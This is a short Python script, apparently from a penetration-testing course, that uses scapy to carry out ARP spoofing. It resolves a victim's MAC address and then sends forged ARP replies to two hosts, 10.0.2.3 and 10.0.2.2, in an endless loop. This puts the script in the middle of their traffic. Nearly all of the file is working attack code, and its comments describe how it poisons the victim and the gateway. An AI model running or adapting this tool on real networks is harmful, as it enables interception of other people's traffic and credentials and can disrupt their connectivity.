#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    #scapy.arping(ip)
    arp_request = scapy.ARP(pdst=ip)
    #arp_request.pdst = ip
    # it will work without the dst="...", but will warn for every data sent out that dst is not configured and defaulting to broadcast Id
    #broadcast = scapy.Ether() 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op=2 means ARP response
    # we are sending a ARP resonse (without a request) to the victim, with the source IP of the gatway
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #packet.show()
    scapy.send(packet)

while True:
    spoof("10.0.2.3", "10.0.2.2")
    spoof("10.0.2.2", "10.0.2.3")
    time.sleep(2)